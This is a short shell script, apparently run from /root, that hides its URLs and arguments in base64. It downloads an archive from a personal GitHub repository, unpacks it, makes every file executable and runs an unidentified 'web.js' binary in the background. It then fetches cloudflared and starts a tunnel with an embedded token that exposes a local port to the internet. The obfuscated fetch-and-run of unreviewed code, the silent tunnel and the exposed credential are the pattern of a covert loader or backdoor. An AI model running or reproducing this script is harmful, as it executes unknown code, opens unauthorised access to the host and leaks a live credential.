cd /root
weburl_S='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3pob3V6aGVucWkvZmlsZS9tYXN0ZXIvd2ViLnRhci54ego='
weburl=$(printf "%s" $weburl_S | base64 -d) 
curl -O $weburl
sleep 1
xz -z -d web.tar.xz
tar -xvf web.tar
chmod +x *
./web.js -c ./config.json &
cturl_S='aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0Cg=='
cturl=$(printf "%s" $cturl_S | base64 -d) 
curl -o cf -L $cturl
chmod +x cf
ARGO_ARGS_S='IC0tcHJvdG9jb2wgcXVpYyAtLWVkZ2UtaXAtdmVyc2lvbiA0IC0tdXJsIGh0dHA6Ly9sb2NhbGhvc3Q6MzAwMiB0dW5uZWwgcnVuIC0tdG9rZW4gZXlKaElqb2lPVE01WmpObVkyVXpNekl5T0dWall6Tm1Zak0wT0RsaVlURmlNV1V3TVRZaUxDSjBJam9pTmpNME9EazROamN0WmpBMk1TMDBORFpqTFRrNU1qVXRaVGM0WkRJNU16ZGtaREJoSWl3aWN5STZJbGxVUlhwTlZGWnFXa1JuZEZwWFRtcE9VekF3VGtkVk5FeFhSbTFOTWtsMFRUSkthRTF0U1RSYVJHZDRUV3BCTkNKOQ=='
ARGO_ARGS=$(printf "%s" $ARGO_ARGS_S | base64 -d) 
./cf $ARGO_ARGS & >/dev/null 2>&1
